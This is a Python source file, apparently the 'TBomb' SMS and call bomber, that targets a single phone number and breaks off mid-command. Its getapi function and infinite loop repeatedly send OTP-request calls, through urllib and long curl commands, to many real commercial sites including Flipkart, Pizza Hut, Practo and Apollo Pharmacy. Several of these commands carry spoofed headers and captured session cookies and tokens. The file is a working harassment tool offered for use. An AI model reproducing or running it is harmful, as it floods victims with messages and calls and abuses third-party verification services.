#!/usr/bin/env python
from datetime import datetime
import os
import hashlib
import sys
import time
import threading
import string
import random
import base64
import urllib.request
import urllib.parse

try:
    import requests
except ImportError:
    print('[!] Error: some dependencies are not installed')
    print('Type \'ติดตั้งตามนี้ pip install -r requirements.txt\' to install all required packages')
    exit()

colors=['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;34m','\033[1;35m','\033[1;36m']
W='\033[0m'
# The Credit For This Code Goes To SpeedX And All Other Contributors Listed At SCK
# If You Wanna Take Credits For This Code, Please Look Yourself Again

country_codes = {
    '93': 'AF',
    '355': 'AL',
    '213': 'DZ',
    '376': 'AD',
    '244': 'AO',
    '672': 'AQ',
    '54': 'AR',
    '374': 'AM',
    '297': 'AW',
    '61': 'AU',
    '43': 'AT',
    '994': 'AZ',
    '973': 'BH',
    '880': 'BD',
    '375': 'BY',
    '32': 'BE',
    '501': 'BZ',
    '229': 'BJ',
    '975': 'BT',
    '591': 'BO',
    '387': 'BA',
    '267': 'BW',
    '55': 'BR',
    '246': 'IO',
    '673': 'BN',
    '359': 'BG',
    '226': 'BF',
    '257': 'BI',
    '855': 'KH',
    '237': 'CM',
    '238': 'CV',
    '236': 'CF',
    '235': 'TD',
    '56': 'CL',
    '86': 'CN',
    '57': 'CO',
    '269': 'KM',
    '682': 'CK',
    '506': 'CR',
    '385': 'HR',
    '53': 'CU',
    '599': 'AN',
    '357': 'CY',
    '420': 'CZ',
    '243': 'CD',
    '45': 'DK',
    '253': 'DJ',
    '670': 'TL',
    '593': 'EC',
    '20': 'EG',
    '503': 'SV',
    '240': 'GQ',
    '291': 'ER',
    '372': 'EE',
    '251': 'ET',
    '500': 'FK',
    '298': 'FO',
    '679': 'FJ',
    '358': 'FI',
    '33': 'FR',
    '689': 'PF',
    '241': 'GA',
    '220': 'GM',
    '995': 'GE',
    '49': 'DE',
    '233': 'GH',
    '350': 'GI',
    '30': 'GR',
    '299': 'GL',
    '502': 'GT',
    '224': 'GN',
    '245': 'GW',
    '592': 'GY',
    '509': 'HT',
    '504': 'HN',
    '852': 'HK',
    '36': 'HU',
    '354': 'IS',
    '91': 'IN',
    '62': 'ID',
    '98': 'IR',
    '964': 'IQ',
    '353': 'IE',
    '972': 'IL',
    '39': 'IT',
    '225': 'CI',
    '81': 'JP',
    '962': 'JO',
    '254': 'KE',
    '686': 'KI',
    '383': 'XK',
    '965': 'KW',
    '996': 'KG',
    '856': 'LA',
    '371': 'LV',
    '961': 'LB',
    '266': 'LS',
    '231': 'LR',
    '218': 'LY',
    '423': 'LI',
    '370': 'LT',
    '352': 'LU',
    '853': 'MO',
    '389': 'MK',
    '261': 'MG',
    '265': 'MW',
    '60': 'MY',
    '960': 'MV',
    '223': 'ML',
    '356': 'MT',
    '692': 'MH',
    '222': 'MR',
    '230': 'MU',
    '262': 'RE',
    '52': 'MX',
    '691': 'FM',
    '373': 'MD',
    '377': 'MC',
    '976': 'MN',
    '382': 'ME',
    '212': 'EH',
    '258': 'MZ',
    '95': 'MM',
    '264': 'NA',
    '674': 'NR',
    '977': 'NP',
    '31': 'NL',
    '687': 'NC',
    '64': 'NZ',
    '505': 'NI',
    '227': 'NE',
    '234': 'NG',
    '683': 'NU',
    '850': 'KP',
    '47': 'SJ',
    '968': 'OM',
    '92': 'PK',
    '680': 'PW',
    '970': 'PS',
    '507': 'PA',
    '675': 'PG',
    '595': 'PY',
    '51': 'PE',
    '63': 'PH',
    '48': 'PL',
    '351': 'PT',
    '974': 'QA',
    '242': 'CG',
    '40': 'RO',
    '7': 'RU',
    '250': 'RW',
    '590': 'MF',
    '290': 'SH',
    '508': 'PM',
    '685': 'WS',
    '378': 'SM',
    '239': 'ST',
    '966': 'SA',
    '221': 'SN',
    '381': 'RS',
    '248': 'SC',
    '232': 'SL',
    '65': 'SG',
    '421': 'SK',
    '386': 'SI',
    '677': 'SB',
    '252': 'SO',
    '27': 'ZA',
    '82': 'KR',
    '211': 'SS',
    '34': 'ES',
    '94': 'LK',
    '249': 'SD',
    '597': 'SR',
    '268': 'SZ',
    '46': 'SE',
    '41': 'CH',
    '963': 'SY',
    '886': 'TW',
    '992': 'TJ',
    '255': 'TZ',
    '66': 'TH',
    '228': 'TG',
    '690': 'TK',
    '676': 'TO',
    '216': 'TN',
    '90': 'TR',
    '993': 'TM',
    '688': 'TV',
    '256': 'UG',
    '380': 'UA',
    '971': 'AE',
    '44': 'GB',
    '1': 'US',
    '598': 'UY',
    '998': 'UZ',
    '678': 'VU',
    '379': 'VA',
    '58': 'VE',
    '84': 'VN',
    '681': 'WF',
    '967': 'YE',
    '260': 'ZM',
    '263': 'ZW'
}


def clr():
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')
def banner():
    
    clr()
    logo=""" ((SCK))                          """
    print(random.choice(colors)+logo+W)
    print("\n")



count_inf = 0


def infinite(pn, dl, ch, max):
    global count_inf
    while True:
        while os.path.exists('proc.xxx'):
            time.sleep(0.5)
        os.system('touch proc.xxx')
        api = random.choice(ch)
        try:
            ret = getapi(pn, api, 91)
        except Exception:
            ret = False
        if not ret:
            while ch.count(api) > 0:
                ch.remove(api)
            continue
        os.system('rm proc.xxx >/dev/null 2>&1')
        count_inf += 1
        # os.system('echo SpeedX >> count.xxx')
        time.sleep(float(dl))
        if (count_inf > maxlim):
            exit()


def checkinternet():
    res = False
    try:
        requests.get('https://www.google.com', verify=True)
        res = False
    except Exception:
        res = True
    if res:
        print("\n\n\tIt seems That Your Internet Speed is Slow or You Are Using Proxies...")
        print('\t\tTBomb Will Stop Now...\n\n')
        banner()
        exit()


def getapi(pn, lim, cc):
    global country_codes
    cc = str(cc).strip()
    cnn = country_codes[cc]
    lim = int(lim)
    url = ["https://www.oyorooms.com/api/pwa/generateotp?country_code=%2B" +
           str(cc) + "&nod=4&phone=" + pn, "https://direct.delhivery.com/delhiverydirect/order/generate-otp?phoneNo=" + pn, "https://securedapi.confirmtkt.com/api/platform/register?mobileNumber=" + pn]
    try:
        if lim < len(url):
            urllib.request.urlopen(str(url[lim]))
            return True
    except (urllib.error.HTTPError, urllib.error.URLError):
        return False
    if lim == 3:
        os.system('curl -s -X POST -H "Host:m.netmeds.com" -H "content-length:76" -H "accept:*/*" -H "origin:https://m.netmeds.com" -H "x-requested-with:XMLHttpRequest" -H "save-data:on" -H "user-agent:Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36" -H "content-type:application/x-www-form-urlencoded; charset=UTF-8" -H "referer:https://m.netmeds.com/customer/account/login/" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6" -H "cookie:checkmobileno-popup=quWqfunF" -H "cookie:section_data_ids=%7B%22cart%22%3A1559721914%2C%22directory-data%22%3A1559721853%7D" -H "cookie:mage-messages=" -H "cookie:_gat_UA-63910444-1=1" -H "cookie:_gac_UA-63910444-1=1.1559721866.CjwKCAjw0N3nBRBvEiwAHMwvNuYvgGcnYSdAie5_0MBknXSXxfrtAQ-otjvqdbr_MPyAf56mFqwQTxoChEUQAvD_BwE" -H "cookie:_gcl_aw=GCL.1559721866.CjwKCAjw0N3nBRBvEiwAHMwvNuYvgGcnYSdAie5_0MBknXSXxfrtAQ-otjvqdbr_MPyAf56mFqwQTxoChEUQAvD_BwE" -H "cookie:_nmstracking=| sms | ADW-CPC-Search-NMS-Brand-OC" -H "cookie:_nmsUTMtrackingsource=ADW-CPC-Search-NMS-Brand-OC&ADW-CPC-Search-NMS-Brand-OC&CPC&ADW-CPC-Search-NMS-Brand-OC" -H "cookie:_nmsCampaign=ADW-CPC-Search-NMS-Brand-OC" -H "cookie:_nmsMedium=CPC" -H "cookie:_nmsSource=ADW-CPC-Search-NMS-Brand-OC" -H "cookie:_nmsAttr=ADW-CPC-Search-NMS-Brand-OC" -H "cookie:private_content_version=eef016e2f8225f631d4a6e1cf8cdf4ac" -H "cookie:mage-cache-sessid=true" -H "cookie:mage-cache-storage-section-invalidation=%7B%7D" -H "cookie:mage-cache-storage=%7B%7D" -H "cookie:form_key=YGWpwHiCN5uglOtY" -H "cookie:_gid=GA1.3.93227781.1559647218" -H "cookie:mage-translation-file-version=%7B%7D" -H "cookie:mage-translation-storage=%7B%7D" -H "cookie:_gcl_au=1.1.656472353.1559647214" -H "cookie:PHPSESSID=b5i36rg02l2jg9cielmm9fl7c6" -H "cookie:cto_lwid=e5917844-4f1b-48f9-bf74-b0bfdd5c79ce" -H "cookie:bsCoId=3558720339100" -H "cookie:bsUl=0" -H "cookie:_fbp=fb.1.1558720332185.799068042" -H "cookie:_ga=GA1.3.185497001.1558720330" -d \'register_mobileno=' + pn + '&logintype=Otp&uniq_identy=quWqfunF&forget_pwd=N\' "https://m.netmeds.com/sociallogin/popup/nmsgetcode/"  > /dev/null 2>&1')
        return True
    elif lim == 4:
        os.system(
            'curl -s -X POST -H "Host:client-api.goomo.com" -H "origin:https://www.goomo.com" -H "client:m-web" -H "x-goomo-platform:mWeb" -H "dnt:1" -H "content-type:application/json" -H "accept:*/*" -H "referer:https://www.goomo.com/hotels" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en-US,en;q=0.9" -d \'{"email":"fakeemail@gmail.com","phone_number":"' + pn + '","country_code":"' + cc + '"}\' "https://client-api.goomo.com/v2/phone_confirmation/verify_user" > /dev/null 2>&1')
        return True
    elif lim == 5:
        os.system('curl -s -X POST -H "Accept:*/*" -H "Accept-Encoding:gzip, deflate, br" -H "Accept-Language:en-US,en;q=0.5" -H "Connection:keep-alive" -H "Content-Length:34" -H "Content-Type:application/x-www-form-urlencoded" -H "Host:www.oriyamatrimony.com" -H "Referer:https://www.oriyamatrimony.com/" -H "User-Agent:Mozilla/5.0 (Windows NT 8.1; Win64; x64; rv:59.0) Gecko/20 Firefox/56.0" -H "X-Requested-With:XMLHttpRequest" -d "countrycode=' +
                  cc + '&mobileno=' + pn + '" "https://www.oriyamatrimony.com/login/mobileappsms-homepage.php"  > /dev/null 2>&1')
        return True
    elif lim == 6:
        os.system(
            'curl -s -X POST -H "host:www.flipkart.com" -H "user-agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0" -H "accept:*/*" -H "accept-language:en-US,en;q=0.5" -H "accept-encoding:gzip, deflate, br" -H "referer:https://www.flipkart.com/" -H "x-user-agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0 FKUA/website/41/website/Desktop" -H "origin:https://www.flipkart.com" -H "connection:keep-alive" -H "Content-Type:application/json; charset=utf-8" -H "Content-Length:53" -d \'{"loginId":["+' + cc + pn + '"],"supportAllStates":true}\' "https://www.flipkart.com/api/6/user/signup/status"  > /dev/null 2>&1')
        return True
    elif lim == 7:
        os.system('curl -s -X POST -H "Host:www.flipkart.com" -H "Connection:keep-alive" -H "Content-Length:60" -H "X-user-agent:Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36 FKUA/website/41/website/Desktop" -H "Origin:https://www.flipkart.com" -H "Save-Data:on" -H "User-Agent:Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36" -H "Content-Type:application/x-www-form-urlencoded" -H "Accept:*/*" -H "Referer:https://www.flipkart.com/" -H "Accept-Encoding:gzip, deflate, br" -H "Accept-Language:en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6" -H "Cookie:T=BR%3Acjvqzhglu1mzt95aydzhvwzq1.1558031092050; SWAB=build-44be9e47461a74d737914207bcbafc30; lux_uid=155867904381892986; AMCVS_17EB401053DAF4840A490D4C%40AdobeOrg=1; AMCV_17EB401053DAF4840A490D4C%40AdobeOrg=-227196251%7CMCIDTS%7C18041%7CMCMID%7C63273353035509304576927719203948933246%7CMCAID%7CNONE%7CMCOPTOUT-1558686245s%7CNONE%7CMCAAMLH-1559283845%7C12%7CMCAAMB-1559283845%7Cj8Odv6LonN4r3an7LhD3WZrU1bUpAkFkkiY1ncBR96t2PTI; s_cc=true; SN=2.VI8085A6A237EB4C62836C8809F0D312EB.SI21A9EC4E99B949B2ACE6361B3F0208CC.VS187649B2B06A44C69824006710CB6D83.1558679078; gpv_pn=HomePage; gpv_pn_t=Homepage; S=d1t17GQVqPz9KPzobP3M4GQkjPy34TjfJxI4SbXVIvhwzm3mE13vfSEulmf90D/7L710qUpMq8mA0k2bx6b2DuwIS4g==; s_sq=%5B%5BB%5D%5D" -d \'loginId=+' + cc + pn + '&state=VERIFIED&churnEmailRequest=false\' "https://www.flipkart.com/api/5/user/otp/generate"  > /dev/null 2>&1')
        return True
    elif lim == 8:
        os.system('curl -s -X POST -H "Host:www.ref-r.com" -H "User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0" -H "Accept:application/json, text/javascript, */*; q=0.01" -H "Accept-Language:en-US,en;q=0.5" -H "Accept-Encoding:gzip, deflate, br" -H "Content-Type:application/x-www-form-urlencoded; charset=UTF-8" -H "X-Requested-With:XMLHttpRequest" -H "Content-Length:26" -H "DNT:1" -H "Connection:keep-alive" -d "mobile=' + pn + '&submit=1&undefined=" "https://www.ref-r.com/clients/lenskart/smsApi"  > /dev/null 2>&1')
        return True
    elif lim == 9:
        rd = os.popen('curl -s -X POST -H "X-DROID-VERSION:4.12.5" -H "API-Version:2.0" -H "user-agent:samsung SM-G9350 0 4.4.2" -H "client-version:Android-4.12.5" -H "X-DROID-VERSION-CODE:158" -H "Accept:application/json" -H "client-name:Practo Android App" -H "Content-Type:application/x-www-form-urlencoded" -H "Host:accounts.practo.com" -H "Connection:Keep-Alive" -H "Content-Length:96" -d  "client_name=Practo+Android+App&fingerprint=&mobile=%2B' + cc + pn + '&device_name=samsung+SM-G9350&"  "https://accounts.practo.com/send_otp"').read()
        return rd.find("success") != -1
    elif lim == 10:
        os.system(
            'curl -s -X POST -H "Host:m.pizzahut.co.in" -H "content-length:114" -H "origin:https://m.pizzahut.co.in" -H "authorization:Bearer ZXlKaGJHY2lPaUpJVXpJMU5pSXNJblI1Y0NJNklrcFhWQ0o5LmV5SmtZWFJoSWpwN0luUnZhMlZ1SWpvaWIzQXhiR0pyZEcxbGRYSTBNWEJyTlRGNWNqQjBkbUZsSWl3aVlYVjBhQ0k2SW1WNVNqQmxXRUZwVDJsS1MxWXhVV2xNUTBwb1lrZGphVTlwU2tsVmVra3hUbWxLT1M1bGVVcDFXVmN4YkdGWFVXbFBhVWt3VGtSbmFVeERTbmRqYld4MFdWaEtOVm96U25aa1dFSjZZVmRSYVU5cFNUVlBSMUY0VDBkUk5FMXBNV2xaVkZVMVRGUlJOVTVVWTNSUFYwMDFUV2t3ZWxwcVp6Vk5ha0V6V1ZSTk1GcHFXV2xNUTBwd1l6Tk5hVTlwU205a1NGSjNUMms0ZG1RelpETk1iVEZvWTI1U2NWbFhUbkpNYlU1MllsTTVhMXBZV214aVJ6bDNXbGhLYUdOSGEybE1RMHBvWkZkUmFVOXBTbTlrU0ZKM1QyazRkbVF6WkROTWJURm9ZMjVTY1ZsWFRuSk1iVTUyWWxNNWExcFlXbXhpUnpsM1dsaEthR05IYTJsTVEwcHNaVWhCYVU5cVJURk9WR3MxVG5wak1VMUVVWE5KYlRWcFdtbEpOazFVVlRGUFZHc3pUWHByZDA1SU1DNVRaM1p4UmxOZldtTTNaSE5pTVdSNGJWVkdkSEExYW5WMk9FNTVWekIyZDE5TVRuTkJNbWhGVkV0eklpd2lkWEJrWVhSbFpDSTZNVFUxT1RrM016a3dORFUxTnl3aWRYTmxja2xrSWpvaU1EQXdNREF3TURBdE1EQXdNQzB3TURBd0xUQXdNREF0TURBd01EQXdNREF3TURBd0lpd2laMlZ1WlhKaGRHVmtJam94TlRVNU9UY3pPVEEwTlRVM2ZTd2lhV0YwSWpveE5UVTVPVGN6T1RBMExDSmxlSEFpT2pFMU5qQTRNemM1TURSOS5CMGR1NFlEQVptTGNUM0ZHM0RpSnQxN3RzRGlJaVZkUFl4ZHIyVzltenk4" -H "x-source-origin:PWAFW" -H "content-type:application/json" -H "accept:application/json, text/plain, */*" -H "user-agent:Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36" -H "save-data:on" -H "languagecode:en" -H "referer:https://m.pizzahut.co.in/login" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6" -H "cookie:_fbp=fb.2.1559973905081.1516144968" -H "cookie:_gat_UA-37858192-4=1" -H "cookie:_ga-ss=1|UA-37858192-4|https%3A%2F%2Fwww.google.com%2F" -H "cookie:_gid=GA1.3.1666290082.1559973902" -H "cookie:_ga=GA1.3.1893416092.1559973902" -H "cookie:run_fullstory_for_user=full_story_fail" -H "cookie:_gcl_au=1.1.2020385110.1559973902" -H "cookie:AKA_A2=A" -d \'{"customer":{"MobileNo":"' + pn + '","UserName":"' + pn + '","merchantId":"98d18d82-ba59-4957-9c92-3f89207a34f6"}}\' "https://m.pizzahut.co.in/api/cart/send-otp?langCode=en"  > /dev/null 2>&1')
        return True
    elif lim == 11:
        os.system('curl -s -X POST -H "host:www.goibibo.com" -H "user-agent:Mozilla/5.0 (Windows NT 8.0; Win32; x32; rv:58.0) Gecko/20100101 Firefox/57.0" -H "accept:text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" -H "accept-language:en-US,en;q=0.5" -H "accept-encoding:gzip, deflate, br" -H "referer:https://www.goibibo.com/mobile/?sms=success" -H "content-type:application/x-www-form-urlencoded" -H "content-length:14" -H "connection:keep-alive" -H "upgrade-insecure-requests:1" -d "mbl=' + pn + '" "https://www.goibibo.com/common/downloadsms/"  > /dev/null 2>&1')
        return True
    elif lim == 12:
        os.popen('rm temp.xxx1 > /dev/null 2>&1')
        os.system(
            'curl -s -X POST -H "Host:www.apollopharmacy.in" -H "content-length:17" -H "accept:*/*" -H "origin:https://www.apollopharmacy.in" -H "x-requested-with:XMLHttpRequest" -H "save-data:on" -H "user-agent:Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36" -H "content-type:application/x-www-form-urlencoded; charset=UTF-8" -H "referer:https://www.apollopharmacy.in/sociallogin/mobile/login/" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6" -H "cookie:__cfduid=d64c65a2edad54086382759cdf599de901558686615" -H "cookie:_ga=GA1.2.1278908803.1558686621" -H "cookie:__ta_device=fAz8eA9Rx40yyIiB5mzvHt4apFaSkMBA" -H "cookie:_fbp=fb.1.1558686627127.655454618" -H "cookie:__stat="BLOCK"" -H "cookie:jv_visits_count_EXRKNIzFkV=1" -H "cookie:__stp={"visit":"returning","uuid":"d9a1c39d-efbd-4911-ac0e-6333455f9fbb"}" -H "cookie:PHPSESSID=vnj2hvk8nga4v1m2hvlmvl88r4" -H "cookie:_gid=GA1.2.132668726.1560239715" -H "cookie:_gat=1" -H "cookie:__ta_visit=f5uvpYKu8EVmJAJmFGXMmXGSTiNQSWRS" -H "cookie:_gat_UA-31142855-1=1" -H "cookie:__ta_ping=1" -H "cookie:mage-cache-storage=%7B%7D" -H "cookie:mage-cache-storage-section-invalidation=%7B%7D" -H "cookie:mage-cache-sessid=true" -H "cookie:mage-messages=" -H "cookie:private_content_version=46e6c8611a9b0d06e662da50ca5cf311" -H "cookie:AWSALB=2177QHjXXrFgaem1w0FrBqZ2aoKrMhI+DibolJaee9cVOP4ZSV2LiLC3tks68ud4ERCydxa8kb4klbiI+VEnNQB0rsyins1USgvHcPOUoz2nySN3SC5G/wpAACIq" -H "cookie:section_data_ids=%7B%22cart%22%3A1560239751%7D" -d \'mobile=' + pn + '\' "https://www.apollopharmacy.in/sociallogin/mobile/sendotp/" --output temp.xxx1')
        while not os.path.exists('temp.xxx1'):
            time.sleep(0.1)
        rd = str(open('temp.xxx1', 'rb').read()) + " "
        return rd.find("sent") != -1
    elif lim == 13:
        rd = ' '
        try:
            rd = os.popen(
                ' curl -s -X POST -H "Host:www.ajio.com" -H "Connection:keep-alive" -H "Content-Length:144" -H "Accept:application/json" -H "Origin:https://www.ajio.com" -H "User-Agent:Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36" -H "content-type:application/json" -H "Referer:https://www.ajio.com/signup" -H "Accept-Encoding:gzip, deflate, br" -H "Accept-Language:en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6" -H "Cookie:_ga=GA1.2.979928319.1560364071; _gid=GA1.2.666270216.1560364071; V=201; _fbp=fb.1.1560364076913.1528349725; cto_lwid=d91bea3a-7610-45aa-8f78-65a0d740fb46; PushSubscriberStatus=DENIED; peclosed=true; G_ENABLED_IDPS=google; TS018cc593=01ef61aed0fca110f50d8e3be2c66eb83188f6df8495c0ed2cd772829370fc12690954aad0834f545b57764467dbb66efb05d481a8958aebb273751956ef9eb383a3ba22dd1c94d82021e9d4c40011d4ab9bd97c6f0a74628ac12e8f7bcb663c1608e7288ebd252051cb84def3b021d3bcf643d3f3728ca9c0d9c780d171578ba966774f11ac44864a7f3da59791cb55f2741f23d72f7843efe9306459c00ec2e5f00065729a8573baba42384bb7cf46eb55cf89f72f1dcd5619a26e4ff32c63d06cac8c4bb158da6640bc0b11193134cbf38050ae0db230aa258b1181749fb0373afe041ad1aeffd0c08be7a62010db02cc65edfb1341d2de54cdf475c5dcd84e16c64c50; _gac_UA-68002030-1=1.1560366197.Cj0KCQjwxYLoBRCxARIsAEf16-tx5UXrrP9SEhR8dPkTL4a9woEF7Ae-kvSlzKdgq35y31DeK3_uhg8aAkRBEALw_wcB; cdigiMrkt=utm_source%3A%7Cutm_medium%3A%7Cdevice%3Amobile%7Cexpires%3AFri%2C%2012%20Jul%202019%2019%3A03%3A17%20GMT%7C; ImpressionCookie=4; ip=10.1.10.1; sessionStatus=true|undefined; FirstPage=Thu Jun 13 2019 00:33:53 GMT+0530 (India Standard Time); _dc_gtm_UA-68002030-1=1; uI=johnyaho%40gmail.com; TS01fe4249=01ef61aed09c32c6a53ce9e431a6a719c416867f2f3ad713fde2e74175bc248acc7a523f41e9751d032859a159bfff87664b90c3d0a9dfb2392f75876ccbe273b8a8e81d7a8d25047453c17a2905eca7eff26b780c" -d \'{"firstName":"Rox","login":"johnyaho@gmail.com","password":"Rock@5star","genderType":"Male","mobileNumber":"' + pn + '","requestType":"SENDOTP"}\' "https://www.ajio.com/api/auth/signupSendOTP" ').read()
        except Exception:
            return True
        if rd.find("\"statusCode\":\"1\"") != -1:
            return True
        else:
            return False
    elif lim == 14:
        con = '{"country_code":"' + cc + '","phone_number":"' + pn + '"}'
        os.popen('rm temp.xxx2 > /dev/null 2>&1')
        os.system('curl -s -X POST -H "Host:api.cloud.altbalaji.com" -H "Connection:keep-alive" -H "Content-Length:' + str(len(con)) +
                  '" -H "Accept:application/json, text/plain, */*" -H "Origin:https://lite.altbalaji.com" -H "Save-Data:on" -H "User-Agent:Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.89 Mobile Safari/537.36" -H "Content-Type:application/json;charset=UTF-8" -H "Referer:https://lite.altbalaji.com/subscribe?progress=input" -H "Accept-Encoding:gzip, deflate, br" -H "Accept-Language:en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6" -d \'' + con + '\' "https://api.cloud.altbalaji.com/accounts/mobile/verify?domain=IN" -o temp.xxx2')
        while not os.path.exists('temp.xxx2'):
            time.sleep(0.1)
        rd = hashlib.md5(open('temp.xxx2', 'rb').read()).hexdigest()
        return rd == '24f467b24087ff48c96321786d89c69f'
    elif lim == 15:
        rd = os.popen('curl -s -X POST -H "Host:www.aala.com" -H "Connection:keep-alive" -H "Accept:application/json, text/javascript, */*; q=0.01" -H "Origin:https://www.aala.com" -H "X-Requested-With:XMLHttpRequest" -H "Save-Data:on" -H "User-Agent:Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36" -H "Content-Type:application/x-www-form-urlencoded; charset=UTF-8" -H "Referer:https://www.aala.com/" -H "Accept-Encoding:gzip, deflate, br" -H "Accept-Language:en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6,ar;q=0.5" -H "Cookie:frontend=a27mn3h3irt1rlt6i55s93p9r5; frontend_cid=8zqBBzwQTMIt9UKg; _BEAMER_USER_ID_gADrycBn12870=c9fe4f7d-b421-4bad-9cf2-0a4db716dff4; G_ENABLED_IDPS=google" -d \'email=' + cc + pn + '&firstname=SpeedX&lastname=SpeedX\' "https://www.aala.com/accustomer/ajax/getOTP"').read().strip()
        return rd.find('code:') != -1
    elif lim == 16:
        os.popen('curl -s -X POST -d \'method=SMS&countryCode=id&phoneNumber=' + cc + pn +
                 '&templateID=pax_android_production\' "https://api.grab.com/grabid/v1/phone/otp"')
        return True
    elif lim == 100:
        rd = os.popen('curl -s -X GET "https://www.makaan.com/apis/nc/sendOtpOnCall/16257065/' +
                      pn + '?callType=otpOnCall"').read()
        return rd.lower().find("new otp has been") != -1
    elif lim == 101:
        rd = os.popen('curl -s -X POST -d mobile=%2B' + cc + '-' + pn +
                      ' https://marketing.tllms.com/elearn/api/v4/authentications/phone_call').read()
        return rd.lower().find("otp requests exceeded") == -1
    elif lim == 102:
        rd = os.popen('curl -s -X POST -H "Host:www.realestateindia.com" -H "content-length:58" -H "accept:text/html, */*; q=0.01" -H "origin:https://www.realestateindia.com" -H "x-requested-with:XMLHttpRequest" -H "save-data:on" -H "user-agent:Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36" -H "content-type:application/x-www-form-urlencoded; charset=UTF-8" -H "referer:https://www.realestateindia.com/thanks.php?newreg" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6" -H "cookie:_gat=1" -H "cookie:rei_mem_mobile_verify_status=0" -H "cookie:rei_mem_email_verify_status=N" -H "cookie:rei_mem_block_status=0" -H "cookie:rei_member_country=IN" -H "cookie:rei_paid_status=0" -H "cookie:rei_member_type=1" -H "cookie:rei_member_email=Fakemam%40ril.com" -H "cookie:rei_member_name=Fakeman" -H "cookie:rei_member_id=1547045" -H "cookie:cooki_sess_id=9q8bsucj6mgvu2dc03bfsvlf07" -H "cookie:name=9q8bsucj6mgvu2dc03bfsvlf07" -H "cookie:_gid=GA1.2.626525909.1560836369" -H "cookie:_ga=GA1.2.1033079331.1560836369" -H "cookie:visitedToken=176961560836367" -d \'action_id=call_to_otp&mob_num=' + pn + '&member_id=1547045\' "https://www.realestateindia.com/mobile-script/indian_mobile_verification_form.php?sid=0.5983221395805354"').read()
        return rd.lower().find("y") != -1
    elif lim == 103:
        os.system(
            'curl -s -X POST -H "Host:www.olx.in" -H "content-length:44" -H "accept:*/*" -H "x-newrelic-id:VQMGU1ZVDxABU1lbBgMDUlI=" -H "origin:https://www.olx.in" -H "user-agent:Mozilla/5.0 (Linux; Android 5.0.2; SH-04G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36" -H "content-type:application/json" -H "referer:https://www.olx.in/" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en-US,en;q=0.9" -H "cookie:onap=16b1b8f48d4x746d47ab-1-16b1b8f48d4x746d47ab-19-1559537345" -H "cookie:bm_sv=CDB97F50DA6615AC420F3E6E77B04E42~OoX2fAuP7ggcNa0VjzE95FzJNKRdJlW09Hja0/cysIGF1sJoBO7i0ndGXqnTWLaunlyxktHLbE8BSstPCRYn8VdP15lvUxK3ZY9ahXOSgwAidxwXd1jCe5wjIzYbiXp5eKNWfFpowhFbpxloe+SrbiE0YHJVPcCV5bmdsHgPfQc=" -H "cookie:AMP_TOKEN=%24NOT_FOUND" -H "cookie:hint=true" -H "cookie:_gid=GA1.2.369819276.1559535517" -H "cookie:_ga=GA1.2.665688753.1559535517" -H "cookie:ldTd=true" -H "cookie:G_ENABLED_IDPS=google" -H "cookie:HIDE_ONBOARDING_LOCATION=true" -H "cookie:testCookie=testCookie" -H "cookie:ak_bmsc=307C5311FB00A3F4E856AFFE1A9D000B0214BED9E0210000909FF45C1E802067~plFZfbMQGgEDr7OWVe9FvqfT24ZtOVMamtYcaip71IYOrv2+SQ6fokSvMk2Uesz5v1sFfaichbtDgeVSj3te3vXJKezSWgvoVWrK7gfzFrLz1ruBm0MQj01V5CmpaTr6tRgDRSN6bks3nqvOHzR0tA1IoqfDfq2MKtmDjbknCI5FlLYUTwqlnwHowYArfybn2n3yilE6VKHjW+tH8kqjAfH8BGuijpmO9pNkgmIyOeaZIVM3k6FGOL3Wj3jLI8uGaU" -H "cookie:_abck=153BD3D333948A58932748CAC3D4C3F40214BED9E0210000909FF45C18838E05~0~8O+udxdG38sBFTPZpaBL4IGj7eUcKJ1VwAtJ52GMO5E=~-1~-1" -H 